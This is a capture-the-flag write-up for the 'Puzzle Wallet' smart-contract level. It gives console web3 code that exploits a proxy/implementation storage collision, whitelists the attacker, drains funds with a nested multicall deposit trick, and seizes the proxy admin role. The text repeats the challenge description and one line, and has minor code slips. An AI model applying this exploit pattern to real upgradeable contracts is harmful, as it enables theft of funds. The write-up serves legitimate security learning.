Puzzle Wallet
Difficulty 7/10

Nowadays, paying for DeFi operations is impossible, fact.

A group of friends discovered how to slightly decrease the cost of performing multiple transactions by batching them in one transaction, so they developed a smart contract for doing this.

They needed this contract to be upgradeable in case the code contained a bug, and they also wanted to prevent people from outside the group from using it. To do so, they voted and assigned two people with special roles in the system: The admin, which has the power of updating the logic of the smart contract. The owner, which controls the whitelist of addresses allowed to use the contract. The contracts were deployed, and the group was whitelisted. Everyone cheered for their accomplishments against evil miners.

Little did they know, their lunch money was at risk…

You'll need to hijack this wallet to become the admin of the proxy.

Things that might help::

Understanding how delegatecalls work and how msg.sender and msg.value behaves when performing one.
Knowing about proxy patterns and the way they handle storage variables.Puzzle Wallet
Difficulty 7/10

Nowadays, paying for DeFi operations is impossible, fact.

A group of friends discovered how to slightly decrease the cost of performing multiple transactions by batching them in one transaction, so they developed a smart contract for doing this.

They needed this contract to be upgradeable in case the code contained a bug, and they also wanted to prevent people from outside the group from using it. To do so, they voted and assigned two people with special roles in the system: The admin, which has the power of updating the logic of the smart contract. The owner, which controls the whitelist of addresses allowed to use the contract. The contracts were deployed, and the group was whitelisted. Everyone cheered for their accomplishments against evil miners.

Little did they know, their lunch money was at risk…

You'll need to hijack this wallet to become the admin of the proxy.

Things that might help::

Understanding how delegatecalls work and how msg.sender and msg.value behaves when performing one.
Knowing about proxy patterns and the way they handle storage variables.

# Solution

I did everything directly from the console.

## 1st step

Exploit the storage conflit between Puzzle Wallet contract and the proxy contract. After compiling the abi of the proxy contract (on remix) you can easily invokes it's pendingAdmin function and change the owner of Puzzle Wallet.

Below is the proxy abi:

```
var proxy = await new web3.eth.Contract([
  {
   "inputs": [
    {
     "internalType": "address",
     "name": "_admin",
     "type": "address"
    },
    {
     "internalType": "address",
     "name": "_implementation",
     "type": "address"
    },
    {
     "internalType": "bytes",
     "name": "_initData",
     "type": "bytes"
    }
   ],
   "stateMutability": "nonpayable",
   "type": "constructor"
  },
  {
   "anonymous": false,
   "inputs": [
    {
     "indexed": true,
     "internalType": "address",
     "name": "implementation",
     "type": "address"
    }
   ],
   "name": "Upgraded",
   "type": "event"
  },
  {
   "stateMutability": "payable",
   "type": "fallback"
  },
  {
   "inputs": [],
   "name": "admin",
   "outputs": [
    {
     "internalType": "address",
     "name": "",
     "type": "address"
    }
   ],
   "stateMutability": "view",
   "type": "function"
  },
  {
   "inputs": [
    {
     "internalType": "address",
     "name": "_expectedAdmin",
     "type": "address"
    }
   ],
   "name": "approveNewAdmin",
   "outputs": [],
   "stateMutability": "nonpayable",
   "type": "function"
  },
  {
   "inputs": [],
   "name": "pendingAdmin",
   "outputs": [
    {
     "internalType": "address",
     "name": "",
     "type": "address"
    }
   ],
   "stateMutability": "view",
   "type": "function"
  },
  {
   "inputs": [
    {
     "internalType": "address",
     "name": "_newAdmin",
     "type": "address"
    }
   ],
   "name": "proposeNewAdmin",
   "outputs": [],
   "stateMutability": "nonpayable",
   "type": "function"
  },
  {
   "inputs": [
    {
     "internalType": "address",
     "name": "_newImplementation",
     "type": "address"
    }
   ],
   "name": "upgradeTo",
   "outputs": [],
   "stateMutability": "nonpayable",
   "type": "function"
  },
  {
   "stateMutability": "payable",
   "type": "receive"
  }
 ], instance)
```

now you can call `await proxy.methods.proposeNewAdmin(player).send({from: player})` and become the owner of the Puzzle Wallet contract

## step 2

add you address as a whitelisted address `await contract.addToWhitelist(player);`

# step 3

Use multicall to drain the wallet of fundsUse multicall to drain the wallet of funds

1 - get the bytes4 value of the deposit function so that we can call it from the multicall function

`var {data: puzzleDeposit } = await contract.deposit.request() // 0xd0e30db0`

2- create the deposit function using the multicall function

`var {data: multiCallFunc} = await contract.multicall.request([ puzzleDeposit]`

3 - create the withdraw all function function

`var {data: executeFunc} = await contract.execute.request(player, web3.eth.toWei(0.002, "ether"), [])`

```
var our3Functions = [
      puzzleDeposit,
      multiCallFunc,
      executeFunc,
    ];
```

call the muticall with the 3 functions reunited:

`await contract.multicall(our3Functions, { from: player, value: web3.utils.toWei('0.001', 'ether')});`

All the fund have been withdrew, you can not change the maxBalance in order to update the admin value from the proxy contract

`await contract.setMaxBalance(player)`
